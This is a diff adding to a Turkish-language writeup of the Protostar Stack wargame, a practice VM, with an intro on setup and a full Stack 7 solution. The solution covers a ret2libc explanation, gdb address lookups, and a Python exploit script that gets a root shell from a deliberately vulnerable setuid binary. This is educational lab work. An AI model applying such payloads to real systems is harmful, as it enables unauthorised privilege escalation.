@@ -6,7 +6,9 @@ categories: Binary Exploitation
 ---
 
 # Protostar Stack Writeup
+`Ön tavsiye`: bu yazıyı okumadan önce stack nedir ve nasıl çalışır, fonksiyon çağrıları nasıl olur, register nedir ne iş yapar gibi kavram ve konular hakkında ufaktan bi fikrinizin olması faydalı olacaktır.
 
+Öncelikle protostar makinesini indirip sanal makine olarak kurmanız gerekmekte, ardından ssh ile makineye bağlanabilirsiniz. soruların binary dosyaları /opt/protostar/bin/ dizini altında yer almakta. Başlayalım :)
 ## Stack 0
 
 Kaynak kod:
@@ -655,3 +657,129 @@ whoami
 root
 ```
 Evet root shell aldık :)
+
+## Stack 7
+Kaynak kod:
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xb0000000) == 0xb0000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+```
+Bu aşamada kısıtlamalarımızda değişiklik var, return adresimiz bf yerine b ile başyalamaz şeklinde kısıtlanmış. Bu aşamda önceden de söylediğim gibi ret2libc ile shell alamaya çalışacağız. Ret2libc'nin mantığını şu şekilde açıklamaya çalışayım: libc kütüphanesi kocaman bir kütüphane ve bunun içinde system fonksiyonu var. Bu system fonksiyonu ile biz shell komutları çalıştırabiliyoruz. Çalıştıracağımız komutu da argüman olarak veriyoruz. (bkz man system) Bunu stackde yapmamız için gerekli olan ise stack düzenini bunu gerçekleştirecek şekilde düzenlemek. Yani:
+```bash
+AAAA.... + ebp + return_addr(system fonksiyonunun adresi) + B*4 + 'bin/sh' stringi adresi
+```
+Şimdi burada ne olacak? Biz return adresini system fonksiyonunun adresi ile ezip /bin/sh stringini de argüman olarak vermiş olacağız ve bu sayede shell alacağız. Ama burada önemli bir nokta var, 4 tane B eklemişiz. Bunun eklememizin sebebi ise system fonksiyonunu fonksiyon çağrısı ile çalıştırmayıp direk zıplayarak çalıştırmamız. Yani normalde biz bir fonksiyona function call ile giderken stack şöyle oluyordu:
+```
+[düşük adres] ... local değişkenler + ebp + ret_addr + argümanlar ... [yüksek adres]
+```
+Yani bir return adresi push ediliyordu ve ardından ebp push ediliyordu. Fonksiyonun parametrelerine erişilirlken de ebp + 8 , ebp + 12 şeklinde erişiliyor. Ama bizim durumumuzda biz system fonksiyonunun başlangıcına direk zıplamış olduğumuz için stack'e herhangi bir return adresi push edilmiyo, bu sefer de ebp üzerinden argümanlara erişirken sıkıntı çıkıyor ve iş patlıyor. bu yüzden stack düzenini düzgün oluşturmak için araya sahte bi adres koyuyoruz. İsterseniz burada exit fonksiyonu adresi vs. de koyabilirsiniz tabii. Şimdi system fonksiyonunun adresini bulalım. Programı gdb ile açıp bakalım.
+```bash
+user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
+Reading symbols from /opt/protostar/bin/stack7...done.
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048545 <main+0>:	push   %ebp
+0x08048546 <main+1>:	mov    %esp,%ebp
+0x08048548 <main+3>:	and    $0xfffffff0,%esp
+0x0804854b <main+6>:	call   0x80484c4 <getpath>
+0x08048550 <main+11>:	mov    %ebp,%esp
+0x08048552 <main+13>:	pop    %ebp
+0x08048553 <main+14>:	ret    
+End of assembler dump.
+(gdb) b*0x08048553
+Breakpoint 1 at 0x8048553: file stack7/stack7.c, line 32.
+(gdb) r
+Starting program: /opt/protostar/bin/stack7 
+input path please: AAAAAAAAAAAAAAAa
+got path AAAAAAAAAAAAAAAa
+
+Breakpoint 1, 0x08048553 in main (argc=134513989, argv=0x1) at stack7/stack7.c:32
+32	stack7/stack7.c: No such file or directory.
+	in stack7/stack7.c
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+```
+system fonksiyonunun adresi `0xb7ecffb0` miş. E biz buna zıplayamayız çünkü b ile başlıyor. O zaman bir önceki çözümde olduğu gibi ret komutunu tekrar çalıştırarak bunu atlatabiliriz. Yani stack içerisini şu iekilde yapmaya çalışacağız:
+```bash
+AAAA.... + ebp + ret_komutu_adresi + system_adresi + B*4 + '/bin/sh'_adresi
+```
+Bir önceki aşamadaki gibi getpath fonksiyonundan ret komutunun adresine bakarsak `0x08048544` adresini buluyoruz. Geriye /bin/sh adresini bulmak kaldı. Bunu gdb içinde yapınca garip bir sonuç veriyor o yüzden strings komutu ile bulacağız:
+```bash
+user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
+ 11f3bf /bin/sh
+ # -a parametresi tüm dosyaya bakmak için
+ # -t x paramteresi bulunan stringin offsetini hex olarak yazdırmak için 
+```
+Aranan stringin ofsetini dosya içindeki ofsetini bulduk, gdb ile libs programda hangi adreste buna bakalım.
+```bash
+(gdb) info proc map
+process 1588
+cmdline = '/opt/protostar/bin/stack7'
+cwd = '/opt/protostar/bin'
+exe = '/opt/protostar/bin/stack7'
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
+	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
+	0xb7e96000 0xb7e97000     0x1000          0        
+	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+	0xb7fd9000 0xb7fdc000     0x3000          0        
+	0xb7fe0000 0xb7fe2000     0x2000          0        
+	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+	0xbffeb000 0xc0000000    0x15000          0           [stack]
+```
+libc `0xb7e97000` adresinden başlıyor. Bizim argümanımız olan string `11f3bf` ofsetindeydi. İkisini toplarsak aradığımız adresi `0xB7FB63BF` olarak buluyoruz.O zaman kodu yazalım:
+```python
+junk = 'A'*80
+ret_addr = '\x44\x85\x04\x08' #0x08048544 ret komutu adresi
+system_addr = '\xb0\xff\xec\xb7' #0xb7ecffb0 system fonksiyonu adresi
+fake_ret = 'B'*4
+bin_sh_addr = '\xbf\x63\xfb\xb7' #0xB7FB63BF /bin/sh adresi
+
+print junk + ret_addr + system_addr + fake_ret + bin_sh_addr
+```
+Ve çalıştıralım...
+```bash
+user@protostar:/tmp$ (python stack7.py; cat)| /opt/protostar/bin/stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD�AAAAAAAAAAAAD�����BBBB�c��
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+whoami
+root
+GG :)
+```
+Bu aşamayı da başarıyla tamamladık ve protostar serisinin stack bölümünü tamamlamış olduk. Okuduğunuz için teşekkürler, umarım bi faydası olmuştur. Protostar format sorularında görüşmek üzere... 
